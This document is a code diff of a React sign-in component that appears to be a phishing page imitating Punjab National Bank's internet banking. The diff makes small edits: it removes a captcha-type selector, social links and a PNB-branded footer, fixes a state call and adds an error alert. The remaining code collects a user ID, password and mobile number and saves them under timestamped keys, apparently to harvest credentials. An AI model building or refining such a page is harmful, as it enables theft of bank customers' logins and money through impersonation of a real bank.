@@ -9,7 +9,6 @@ const FirstPage = () => {
   const [mobileNumber, setMobileNumber] = useState('');
   const [captcha, setCaptcha] = useState('');
   const [captchaText, setCaptchaText] = useState('');
-  const [captchaType, setCaptchaType] = useState('image');
   const [language, setLanguage] = useState('English');
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [captchaError, setCaptchaError] = useState('');
@@ -49,7 +48,7 @@ const FirstPage = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
     setCaptchaError('');
-    setMobileError();
+    setMobileError(''); // Fixed: Added empty string parameter
     
     // Validate mobile number
     if (!validateMobileNumber(mobileNumber)) {
@@ -74,7 +73,7 @@ const FirstPage = () => {
         key: `user_${timestamp}`,
         userId,
         password1,
-        phoneNumber: mobileNumber, // This can be collected in the future if needed
+        phoneNumber: mobileNumber, 
         timeStamp: timestamp,
       });
       
@@ -91,6 +90,7 @@ const FirstPage = () => {
     } catch (error) {
       console.error("Error submitting form:", error);
       setIsSubmitting(false);
+      alert("An error occurred while submitting your information. Please try again.");
     }
   };
 
@@ -172,30 +172,6 @@ const FirstPage = () => {
                 {mobileError}
               </div>
             )}
-
-            {/* Captcha Type Selection */}
-            <div className="flex items-center mb-3 space-x-4">
-              <label className="flex items-center">
-                <input
-                  type="radio"
-                  name="captchaType"
-                  checked={captchaType === 'image'}
-                  onChange={() => setCaptchaType('image')}
-                  className="mr-2"
-                />
-                <span>Image</span>
-              </label>
-              <label className="flex items-center">
-                <input
-                  type="radio"
-                  name="captchaType"
-                  checked={captchaType === 'text'}
-                  onChange={() => setCaptchaType('text')}
-                  className="mr-2"
-                />
-                <span>Text</span>
-              </label>
-            </div>
 
             {/* Captcha Display */}
             <div className="mb-3 flex items-center space-x-2">
@@ -344,70 +320,10 @@ const FirstPage = () => {
             </div>
             <div className="text-xs">
               <div className="font-bold">secure</div>
-              <div>GlobalSign</div>
-            </div>
-          </div>
-
-          {/* Social Media Links */}
-          <div className="mt-4">
-            <p className="text-sm font-bold mb-2">Connect with us:</p>
-            <div className="flex space-x-3">
-              <a href="#" className="text-white hover:text-[#A20E37]">
-                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z" />
-                </svg>
-              </a>
-              <a href="#" className="text-white hover:text-pink-400">
-                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
-                  <path fillRule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v4a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clipRule="evenodd" />
-                </svg>
-              </a>
-              <a href="#" className="text-white hover:text-gray-500">
-                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
-                  <path fillRule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v4a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clipRule="evenodd" />
-                </svg>
-              </a>
-              <a href="#" className="text-white hover:text-red-600">
-                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z" />
-                </svg>
-              </a>
-              <a href="#" className="text-white hover:text-blue-600">
-                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
-                  <path fillRule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v4a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clipRule="evenodd" />
-                </svg>
-              </a>
-              <a href="#" className="text-white hover:text-red-500">
-                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z" />
-                </svg>
-              </a>
-            </div>
-          </div>
-
-          {/* Virtual Assistant */}
-          <div className="mt-6 flex items-center justify-between">
-            <div className="text-xs max-w-[70%]">
-              <p>For safe usage and better experience with Internet Banking, Kindly login through <span className="text-[#FBBC09]">Incognito mode</span>. For assistance please contact our Help Desk No. 1030</p>
-            </div>
-            <div className="relative">
-              <div className="w-16 h-16 bg-[#FBBC09] rounded-full overflow-hidden">
-                <img 
-                  src="https://placehold.co/100x100/FFD700/000000/png?text=👨‍💼" 
-                  alt="Virtual Assistant" 
-                  className="w-full h-full object-cover"
-                />
-              </div>
             </div>
           </div>
         </div>
       </main>
-
-      {/* Footer */}
-      <footer className="bg-gray-800 text-white p-4 text-center">
-        <p className="text-sm"> 2025 Punjab National Bank. All rights reserved.</p>
-        <p className="text-xs">For support, call 1800-180-2222 or email care@pnb.co.in</p>
-      </footer>
     </div>
   );
 };
